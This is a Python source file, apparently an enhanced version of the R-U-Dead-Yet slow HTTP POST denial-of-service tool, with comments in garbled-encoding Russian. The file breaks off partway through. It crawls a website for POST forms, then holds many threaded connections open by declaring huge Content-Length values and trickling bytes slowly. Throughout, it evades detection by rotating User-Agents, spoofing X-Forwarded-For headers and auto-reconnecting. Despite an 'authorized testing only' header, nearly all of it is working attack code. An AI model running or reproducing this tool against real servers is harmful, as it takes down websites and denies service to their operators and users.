#!/usr/bin/env python3
"""
R-U-Dead-Yet v3.1 - Enhanced Slow HTTP POST Test Tool
FOR AUTHORIZED SECURITY TESTING ONLY
"""
import sys
import os
import socket
import ssl
import threading
import time
import random
import re
import argparse
import logging
from urllib.parse import urlparse, urljoin
from http.client import HTTPConnection, HTTPSConnection
from html.parser import HTMLParser
from configparser import ConfigParser
from datetime import datetime
import json

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'rudy_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class HTMLFormParser(HTMLParser):
    """–ü–∞—Ä—Å–µ—Ä HTML –¥–ª—è –ø–æ–∏—Å–∫–∞ —Ñ–æ—Ä–º —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π"""
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.current_inputs = []
        self.depth = 0
        
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        
        if tag.lower() == 'form':
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'get').lower(),
                'id': attrs_dict.get('id', ''),
                'class': attrs_dict.get('class', ''),
                'inputs': []
            }
            self.depth += 1
            
        elif tag.lower() == 'input' and self.current_form:
            input_type = attrs_dict.get('type', 'text').lower()
            if input_type in ['text', 'password', 'hidden', 'email', 'submit', 'textarea']:
                input_field = {
                    'name': attrs_dict.get('name', ''),
                    'type': input_type,
                    'value': attrs_dict.get('value', ''),
                    'placeholder': attrs_dict.get('placeholder', '')
                }
                if input_field['name'] or input_field['type'] == 'submit':
                    self.current_form['inputs'].append(input_field)
                    
        elif tag.lower() == 'textarea' and self.current_form:
            textarea_field = {
                'name': attrs_dict.get('name', ''),
                'type': 'textarea',
                'value': '',
                'placeholder': attrs_dict.get('placeholder', '')
            }
            if textarea_field['name']:
                self.current_form['inputs'].append(textarea_field)
    
    def handle_endtag(self, tag):
        if tag.lower() == 'form' and self.current_form:
            self.depth -= 1
            if self.depth == 0:
                if self.current_form['inputs']:
                    self.forms.append(self.current_form)
                self.current_form = None
    
    def handle_data(self, data):
        # –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫—É –¥–∞–Ω–Ω—ã—Ö –≤–Ω—É—Ç—Ä–∏ textarea
        pass

class AdvancedTargetScanner:
    """–£–ª—É—á—à–µ–Ω–Ω—ã–π —Å–∫–∞–Ω–µ—Ä —Ü–µ–ª–∏"""
    def __init__(self, base_url, timeout=10):
        self.base_url = base_url
        self.parsed_url = urlparse(base_url)
        self.timeout = timeout
        self.forms = []
        self.discovered_pages = set()
        self.session_cookies = {}
        
    def create_connection(self, parsed_url):
        """–°–æ–∑–¥–∞–µ—Ç HTTP/HTTPS —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
        if parsed_url.scheme == 'https':
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = HTTPSConnection(
                parsed_url.netloc, 
                timeout=self.timeout, 
                context=context
            )
        else:
            conn = HTTPConnection(parsed_url.netloc, timeout=self.timeout)
        return conn
    
    def fetch_page(self, url=None, method='GET'):
        """–ü–æ–ª—É—á–∞–µ—Ç HTML —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π"""
        target_url = url or self.base_url
        parsed = urlparse(target_url)
        
        try:
            conn = self.create_connection(parsed)
            
            path = parsed.path or '/'
            if parsed.query:
                path += '?' + parsed.query
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Referer': self.base_url
            }
            
            if self.session_cookies:
                headers['Cookie'] = '; '.join([f"{k}={v}" for k, v in self.session_cookies.items()])
            
            conn.request(method, path, headers=headers)
            response = conn.getresponse()
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º cookies –µ—Å–ª–∏ –µ—Å—Ç—å
            if 'Set-Cookie' in response.headers:
                cookie_header = response.headers['Set-Cookie']
                # –ü—Ä–æ—Å—Ç–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ cookies
                cookies = cookie_header.split(';')[0].split('=')
                if len(cookies) == 2:
                    self.session_cookies[cookies[0]] = cookies[1]
            
            html_content = response.read()
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–¥–∏—Ä–æ–≤–∫—É
            content_type = response.headers.get('Content-Type', '')
            if 'charset=' in content_type:
                charset = content_type.split('charset=')[-1].split(';')[0]
                try:
                    html_content = html_content.decode(charset, errors='ignore')
                except:
                    html_content = html_content.decode('utf-8', errors='ignore')
            else:
                html_content = html_content.decode('utf-8', errors='ignore')
            
            conn.close()
            return html_content, response.status
            
        except Exception as e:
            logger.error(f"Error fetching {target_url}: {e}")
            return None, None
    
    def extract_links(self, html_content, base_url):
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç —Å—Å—ã–ª–∫–∏ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã"""
        links = set()
        patterns = [
            r'href=[\'"]?([^\'" >]+)[\'"]?',
            r'src=[\'"]?([^\'" >]+)[\'"]?',
            r'action=[\'"]?([^\'" >]+)[\'"]?'
        ]
        
        for pattern in patterns:
            found_links = re.findall(pattern, html_content, re.IGNORECASE)
            for link in found_links:
                full_url = urljoin(base_url, link)
                if self.is_internal_link(full_url):
                    links.add(full_url)
        
        return links
    
    def find_forms(self, html_content, page_url):
        """–ù–∞—Ö–æ–¥–∏—Ç –≤—Å–µ —Ñ–æ—Ä–º—ã –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ"""
        parser = HTMLFormParser()
        parser.feed(html_content)
        
        forms = []
        for form in parser.forms:
            if form['method'] in ['post', 'POST']:
                # –ù–æ—Ä–º–∞–ª–∏–∑—É–µ–º URL –¥–µ–π—Å—Ç–≤–∏—è
                action = form['action']
                if not action or action.strip() == '':
                    action = page_url
                elif not action.startswith(('http://', 'https://')):
                    if action.startswith('/'):
                        action = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{action}"
                    else:
                        action = urljoin(page_url, action)
                
                # –§–∏–ª—å—Ç—Ä—É–µ–º —Ç–æ–ª—å–∫–æ –ø–æ–ª–µ–∑–Ω—ã–µ –ø–æ–ª—è
                useful_inputs = []
                for inp in form['inputs']:
                    if inp['type'] not in ['submit', 'button'] and inp['name']:
                        useful_inputs.append(inp['name'])
                
                if useful_inputs:
                    forms.append({
                        'action': action,
                        'method': form['method'],
                        'inputs': useful_inputs,
                        'source_url': page_url,
                        'id': form.get('id', ''),
                        'class': form.get('class', '')
                    })
        
        return forms
    
    def is_internal_link(self, url):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —Å—Å—ã–ª–∫–∞ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–π"""
        try:
            parsed = urlparse(url)
            base_domain = '.'.join(self.parsed_url.netloc.split(':')[0].split('.')[-2:])
            target_domain = '.'.join(parsed.netloc.split(':')[0].split('.')[-2:])
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —ç—Ç–æ –≤–∞–ª–∏–¥–Ω—ã–π URL –∏ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Ñ–∞–π–ª–æ–º
            if not parsed.netloc or parsed.netloc == '':
                return True
                
            if target_domain == base_domain:
                # –ò—Å–∫–ª—é—á–∞–µ–º —Ñ–∞–π–ª—ã —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è–º–∏
                excluded_ext = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.css', '.js']
                if not any(parsed.path.lower().endswith(ext) for ext in excluded_ext):
                    return True
        except:
            pass
        return False
    
    def scan_site(self, max_pages=20, max_depth=3):
        """–°–∫–∞–Ω–∏—Ä—É–µ—Ç —Å–∞–π—Ç –Ω–∞ –Ω–∞–ª–∏—á–∏–µ POST-—Ñ–æ—Ä–º —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ–π –≥–ª—É–±–∏–Ω–æ–π"""
        logger.info(f"Scanning {self.base_url} for POST forms (max pages: {max_pages})...")
        
        to_scan = [(self.base_url, 0)]  # (url, depth)
        scanned = set()
        all_forms = []
        
        while to_scan and len(scanned) < max_pages:
            url, depth = to_scan.pop(0)
            
            if url in scanned or depth > max_depth:
                continue
                
            logger.debug(f"Scanning page: {url} (depth: {depth})")
            scanned.add(url)
            
            html, status = self.fetch_page(url)
            if html and status == 200:
                # –ò—â–µ–º —Ñ–æ—Ä–º—ã –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
                page_forms = self.find_forms(html, url)
                all_forms.extend(page_forms)
                
                # –ò—â–µ–º —Å—Å—ã–ª–∫–∏ –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
                if depth < max_depth:
                    links = self.extract_links(html, url)
                    for link in links:
                        if link not in scanned and link not in [u for u, _ in to_scan]:
                            to_scan.append((link, depth + 1))
            
            # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
            time.sleep(random.uniform(0.5, 1.5))
        
        # –£–¥–∞–ª—è–µ–º –¥—É–±–ª–∏–∫–∞—Ç—ã
        unique_forms = []
        seen = set()
        for form in all_forms:
            key = (form['action'], tuple(sorted(form['inputs'])))
            if key not in seen:
                seen.add(key)
                unique_forms.append(form)
        
        logger.info(f"Found {len(unique_forms)} unique POST forms")
        return unique_forms

class EnhancedSlowPostConnection:
    """–£–ª—É—á—à–µ–Ω–Ω–æ–µ –º–µ–¥–ª–µ–Ω–Ω–æ–µ POST-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
    def __init__(self, target_url, form_action, post_param, connection_id, 
                 config=None):
        self.target_url = target_url
        self.form_action = form_action
        self.post_param = post_param
        self.connection_id = connection_id
        self.config = config or {}
        
        parsed = urlparse(form_action)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.path = parsed.path or '/'
        self.use_ssl = parsed.scheme == 'https'
        
        self.socket = None
        self.running = False
        self.bytes_sent = 0
        self.start_time = None
        self.packets_sent = 0
        self.last_activity = None
        
        # –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∞—Ç–∞–∫–∏
        self.chunk_size_min = self.config.get('chunk_min', 1)
        self.chunk_size_max = self.config.get('chunk_max', 10)
        self.delay_min = self.config.get('delay_min', 0.5)
        self.delay_max = self.config.get('delay_max', 5.0)
        self.content_length = self.config.get('content_length', random.randint(5000000, 20000000))
        
        # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –∞–≥–µ–Ω—Ç—ã
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
        ]
    
    def create_secure_socket(self):
        """–°–æ–∑–¥–∞–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ SSL —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
        try:
            # –°–æ–∑–¥–∞–µ–º –æ–±—ã—á–Ω—ã–π —Å–æ–∫–µ—Ç
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))
            
            if self.use_ssl:
                # –°–æ–∑–¥–∞–µ–º SSL –∫–æ–Ω—Ç–µ–∫—Å—Ç
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # –û–±–µ—Ä—Ç—ã–≤–∞–µ–º —Å–æ–∫–µ—Ç –≤ SSL
                ssl_sock = context.wrap_socket(
                    sock,
                    server_hostname=self.host
                )
                return ssl_sock
            
            return sock
            
        except Exception as e:
            logger.error(f"[{self.connection_id}] Socket creation failed: {e}")
            return None
    
    def generate_custom_headers(self):
        """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –∫–∞—Å—Ç–æ–º–Ω—ã–µ HTTP-–∑–∞–≥–æ–ª–æ–≤–∫–∏"""
        headers = [
            f"POST {self.path} HTTP/1.1",
            f"Host: {self.host}",
            f"User-Agent: {random.choice(self.user_agents)}",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {self.content_length}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Cache-Control: no-cache",
            "Pragma: no-cache",
            "\r\n"
        ]
        
        # –î–æ–±–∞–≤–ª—è–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏
        extra_headers = [
            "X-Requested-With: XMLHttpRequest",
            "X-Forwarded-For: " + ".".join(str(random.randint(1, 255)) for _ in range(4)),
            "DNT: 1",
            "Upgrade-Insecure-Requests: 1"
        ]
        
        # –í—ã–±–∏—Ä–∞–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–ª—É—á–∞–π–Ω—ã—Ö –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
        for _ in range(random.randint(1, 3)):
            headers.insert(random.randint(5, len(headers)-2), random.choice(extra_headers))
        
        return "\r\n".join(headers)
    
    def send_slowly(self):
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –¥–∞–Ω–Ω—ã–µ –º–µ–¥–ª–µ–Ω–Ω–æ —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –ª–æ–≥–∏–∫–æ–π"""
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏
            headers = self.generate_custom_headers()
            initial_data = f"{headers}{self.post_param}="
            
            self.socket.send(initial_data.encode())
            self.bytes_sent += len(initial_data)
            self.packets_sent += 1
            self.last_activity = time.time()
            
            logger.debug(f"[{self.connection_id}] Initial headers sent")
            
            # –ú–µ–¥–ª–µ–Ω–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–ª–∞
            while self.running:
                try:
                    # –°–ª—É—á–∞–π–Ω—ã–π —Ä–∞–∑–º–µ—Ä —á–∞–Ω–∫–∞
                    chunk_size = random.randint(self.chunk_size_min, self.chunk_size_max)
                    
                    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                    if random.random() > 0.7:  # 30% —à–∞–Ω—Å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã
                        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789%&*()"
                        chunk = ''.join(random.choice(charset) for _ in range(chunk_size))
                    else:
                        chunk = "A" * chunk_size
                    
                    # –°–ª—É—á–∞–π–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞
                    delay = random.uniform(self.delay_min, self.delay_max)
                    
                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–∞–Ω–∫
                    self.socket.send(chunk.encode())
                    self.bytes_sent += chunk_size
                    self.packets_sent += 1
                    self.last_activity = time.time()
                    
                    # –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
                    if self.packets_sent % 10 == 0:
                        self.check_connection()
                    
                    # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
                    if self.packets_sent % 50 == 0:
                        elapsed = time.time() - self.start_time
                        speed = self.bytes_sent / elapsed if elapsed > 0 else 0
                        logger.debug(
                            f"[{self.connection_id}] Progress: {self.bytes_sent} bytes, "
                            f"{self.packets_sent} packets, {speed:.2f} B/s"
                        )
                    
                    # –ê–¥–∞–ø—Ç–∏–≤–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞
                    time.sleep(delay)
                    
                except (socket.error, ConnectionResetError, BrokenPipeError) as e:
                    logger.info(f"[{self.connection_id}] Connection error: {e}")
                    return False
                except Exception as e:
                    logger.error(f"[{self.connection_id}] Unexpected error: {e}")
                    return False
            
            return True
            
        except Exception as e:
            logger.error(f"[{self.connection_id}] Fatal error in send_slowly: {e}")
            return False
    
    def check_connection(self):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –∂–∏–≤–æ –ª–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å –ø–æ–º–æ—â—å—é MSG_PEEK
            self.socket.settimeout(0.5)
            data = self.socket.recv(1, socket.MSG_PEEK)
            if data == b'':
                logger.debug(f"[{self.connection_id}] Connection appears closed")
                return False
            return True
        except socket.timeout:
            # –¢–∞–π–º–∞—É—Ç - —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –≤—Å–µ –µ—â–µ –∞–∫—Ç–∏–≤–Ω–æ
            return True
        except Exception:
            return False
        finally:
            self.socket.settimeout(30)
    
    def run(self):
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç –º–µ–¥–ª–µ–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
        self.start_time = time.time()
        self.running = True
        
        logger.info(f"[{self.connection_id}] Starting connection to {self.host}:{self.port}")
        
        try:
            # –°–æ–∑–¥–∞–µ–º —Å–æ–∫–µ—Ç
            self.socket = self.create_secure_socket()
            if not self.socket:
                logger.error(f"[{self.connection_id}] Failed to create socket")
                return
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º –º–µ–¥–ª–µ–Ω–Ω—É—é –æ—Ç–ø—Ä–∞–≤–∫—É
            success = self.send_slowly()
            
            if not success and self.running:
                logger.info(f"[{self.connection_id}] Attempting to reconnect...")
                time.sleep(random.uniform(2, 5))
                self.run()  # –†–µ–∫—É—Ä—Å–∏–≤–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
                
        except KeyboardInterrupt:
            logger.info(f"[{self.connection_id}] Interrupted by user")
        except Exception as e:
            logger.error(f"[{self.connection_id}] Critical error: {e}")
        finally:
            self.close()
            elapsed = time.time() - self.start_time if self.start_time else 0
            logger.info(
                f"[{self.connection_id}] Finished. Sent {self.bytes_sent:,} bytes "
                f"in {self.packets_sent} packets over {elapsed:.1f}s"
            )
    
    def close(self):
        """–ö–æ—Ä—Ä–µ–∫—Ç–Ω–æ –∑–∞–∫—Ä—ã–≤–∞–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
        self.running = False
        try:
            if self.socket:
                # –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å FIN –ø–∞–∫–µ—Ç
                self.socket.shutdown(socket.SHUT_RDWR)
                self.socket.close()
        except:
            pass
        finally:
            self.socket = None

class IntelligentConnectionManager:
    """–ò–Ω—Ç–µ–ª–ª–µ–∫—Ç—É–∞–ª—å–Ω—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π"""
    def __init__(self):
        self.connections = []
        self.running = False
        self.stats_lock = threading.Lock()
        self.stats = {
            'total_connections': 0,
            'active_connections': 0,
            'total_bytes_sent': 0,
            'total_packets_sent': 0,
            'start_time': None,
            'failed_connections': 0,
            'reconnections': 0
        }
        self.config = {
            'chunk_min': 1,
            'chunk_max': 10,
            'delay_min': 0.5,
            'delay_max': 5.0,
            'max_reconnect_attempts': 3
        }
    
    def update_stats(self, key, value):
        """–ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏"""
        with self.stats_lock:
            if key in self.stats:
                if isinstance(self.stats[key], (int, float)):
                    self.stats[key] += value
                else:
                    self.stats[key] = value
    
    def start_attack(self, target_url, form_action, post_param, num_connections, 
                     attack_config=None):
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç —É–ª—É—á—à–µ–Ω–Ω—É—é –∞—Ç–∞–∫—É"""
        self.running = True
        self.stats['start_time'] = time.time()
        self.stats['total_connections'] = num_connections
        
        if attack_config:
            self.config.update(attack_config)
        
        logger.info(f"üöÄ Starting advanced attack with {num_connections} connections")
        logger.info(f"üéØ Target: {form_action}")
        logger.info(f"üìù Parameter: {post_param}")
        logger.info(f"‚öôÔ∏è  Configuration: {self.config}")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        monitor_thread = threading.Thread(target=self.monitor_and_display, daemon=True)
        monitor_thread.start()
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        for i in range(num_connections):
            if not self.running:
                break
                
            conn_id = i + 1
            conn = EnhancedSlowPostConnection(
                target_url=target_url,
                form_action=form_action,
                post_param=post_param,
                connection_id=conn_id,
                config=self.config
            )
            
            self.connections.append(conn)
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
            thread = threading.Thread(target=conn.run, daemon=True)
            thread.start()
            
            # –ê–¥–∞–ø—Ç–∏–≤–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—É—Å–∫–æ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
            delay = max(0.1, 1.0 / (num_connections / 10))
            time.sleep(random.uniform(delay * 0.5, delay * 1.5))
            
            if (conn_id) % 10 == 0:
                logger.info(f"Started {conn_id}/{num_connections} connections")
        
        # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
        try:
            while any(conn.running for conn in self.connections) and self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
            self.stop()
    
    def monitor_and_display(self):
        """–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏"""
        try:
            last_display = 0
            while self.running:
                current_time = time.time()
                
                # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
                active_count = sum(1 for conn in self.connections if conn.running)
                total_bytes = sum(conn.bytes_sent for conn in self.connections)
                total_packets = sum(conn.packets_sent for conn in self.connections)
                
                self.update_stats('active_connections', active_count - self.stats['active_connections'])
                self.update_stats('total_bytes_sent', total_bytes - self.stats['total_bytes_sent'])
                self.update_stats('total_packets_sent', total_packets - self.stats['total_packets_sent'])
                
                # –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –∫–∞–∂–¥—ã–µ 2 —Å–µ–∫—É–Ω–¥—ã
                if current_time - last_display >= 2:
                    elapsed = current_time - self.stats['start_time']
                    speed = total_bytes / elapsed if elapsed > 0 else 0
                    
                    # –¶–≤–µ—Ç–Ω–æ–π –≤—ã–≤–æ–¥ –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª
                    if sys.stdout.isatty():
                        print(f"\r\033[92mActive: {active_count:3d}/{self.stats['total_connections']:3d}\033[0m | "
                              f"\033[93mBytes: {total_bytes:12,}\033[0m | "
                              f"\033[94mSpeed: {speed/1024:7.2f} KB/s\033[0m | "
                              f"\033[95mTime: {elapsed:6.0f}s\033[0m | "
                              f"\033[96mPackets: {total_packets:6d}\033[0m", 
                              end="", flush=True)
                    else:
                        print(f"\rActive: {active_count:3d}/{self.stats['total_connections']:3d} | "
                              f"Bytes: {total_bytes:12,} | "
                              f"Speed: {speed/1024:7.2f} KB/s | "
                              f"Time: {elapsed:6.0f}s | "
                              f"Packets: {total_packets:6d}", 
                              end="", flush=True)
                    
                    last_display = current_time
                
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º —É–º–µ—Ä—à–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
                if active_count < self.stats['total_connections'] * 0.7:  # –ï—Å–ª–∏ –º–µ–Ω–µ–µ 70% –∞–∫—Ç–∏–≤–Ω—ã
                    self.reconnect_dead_connections()
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            pass
        except Exception as e:
            logger.error(f"Monitoring error: {e}")
    
    def reconnect_dead_connections(self):
        """–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ—Ç —É–º–µ—Ä—à–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è"""
        for i, conn in enumerate(self.connections):
            if not conn.running and conn.packets_sent < 100:  # –£–º–µ—Ä–ª–æ —Å–ª–∏—à–∫–æ–º —Ä–∞–Ω–æ
                try:
                    logger.info(f"Reconnecting connection {conn.connection_id}")
                    
                    # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
                    new_conn = EnhancedSlowPostConnection(
                        target_url=conn.target_url,
                        form_action=conn.form_action,
                        post_param=conn.post_param,
                        connection_id=conn.connection_id,
                        config=self.config
                    )
                    
                    # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –Ω–æ–≤–æ–º –ø–æ—Ç–æ–∫–µ
                    thread = threading.Thread(target=new_conn.run, daemon=True)
                    thread.start()
                    
                    self.connections[i] = new_conn
                    self.stats['reconnections'] += 1
                    
                except Exception as e:
                    logger.error(f"Failed to reconnect {conn.connection_id}: {e}")
                    self.stats['failed_connections'] += 1
    
    def stop(self):
        """–ö–æ—Ä—Ä–µ–∫—Ç–Ω–æ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –≤—Å–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è"""
        logger.info("üõë Stopping all connections...")
        self.running = False
        
        # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤—Å–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        for conn in self.connections:
            conn.running = False
        
        # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∑–∞–∫—Ä—ã—Ç–∏–µ
        time.sleep(3)
        
        # –§–æ—Ä—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ –∑–∞–∫—Ä—ã–≤–∞–µ–º
        for conn in self.connections:
            conn.close()
        
        # –í—ã–≤–æ–¥–∏–º —Ñ–∏–Ω–∞–ª—å–Ω—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        total_bytes = sum(conn.bytes_sent for conn in self.connections)
        
        print("\n" + "="*70)
        logger.info("üìä ATTACK SUMMARY")
        logger.info(f"   Total duration: {elapsed:.1f} seconds")
        logger.info(f"   Total bytes sent: {total_bytes:,}")
        logger.info(f"   Total packets sent: {self.stats['total_packets_sent']:,}")
        logger.info(f"   Average speed: {total_bytes/elapsed/1024:.2f} KB/s" if elapsed > 0 else "   Average speed: N/A")
        logger.info(f"   Reconnections: {self.stats['reconnections']}")
        logger.info(f"   Failed connections: {self.stats['failed_connections']}")
        print("="*70)

def save_scan_results(forms, filename="scan_results.json"):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –≤ JSON"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(forms, f, indent=2, ensure_ascii=False)
        logger.info(f"Scan results saved to {filename}")
    except Exception as e:
        logger.error(f"Failed to save scan results: {e}")

def load_config(config_file='rudeadyet.conf'):
